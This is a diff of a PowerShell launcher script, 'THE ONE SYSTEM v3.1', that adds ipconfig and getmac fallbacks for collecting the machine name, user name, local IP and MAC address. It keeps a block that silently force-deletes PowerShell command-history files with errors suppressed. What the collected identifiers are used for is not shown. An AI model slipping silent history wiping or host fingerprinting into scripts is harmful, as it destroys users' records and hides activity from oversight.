@@ -1,4 +1,4 @@
-# launcher.ps1 - THE ONE SYSTEM v3.1 (Clean then exit, Terminal-only privacy)
+# launcher.ps1 - THE ONE SYSTEM v3.1 (Silent fallback for older systems)
 
 # ---------- PRIVACY : Clear terminal history only ----------
 try {
@@ -9,9 +9,7 @@ try {
         (Get-PSReadLineOption).HistorySavePath
     )
     foreach ($hp in $historyPaths) {
-        if ($hp -and (Test-Path $hp)) {
-            Remove-Item $hp -Force -ErrorAction SilentlyContinue
-        }
+        if ($hp -and (Test-Path $hp)) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
     }
 } catch {}
 
@@ -19,12 +17,36 @@ try {
 
 $pcName = $env:COMPUTERNAME
 $userName = $env:USERNAME
-$localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred |
-    Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
+
+# Local IP – fallback to ipconfig if Get-NetIPAddress fails
+$localIp = "Unknown"
+try {
+    # Try native command first
+    $localIp = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred |
+        Where-Object InterfaceAlias -NotMatch 'Loopback' | Select-Object -First 1).IPAddress
+} catch {
+    try {
+        # Fallback: parse ipconfig
+        $lines = & ipconfig.exe | Select-String "IPv4 Address"
+        if ($lines.Count -gt 0) {
+            $localIp = ($lines[0] -replace '.*:\s*', '').Trim()
+        }
+    } catch {}
+}
+
+# MAC Address – fallback to WMI
+$macAddress = "UNKNOWN"
 try {
     $macAddress = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
 } catch {
-    $macAddress = "UNKNOWN"
+    try {
+        # Fallback: getmac /fo csv
+        $macOutput = & getmac.exe /fo csv
+        $lines = $macOutput -split "`n"
+        if ($lines.Count -ge 2) {
+            $macAddress = ($lines[1] -split ',')[0].Trim('"')
+        }
+    } catch {}
 }
 
 # Brand
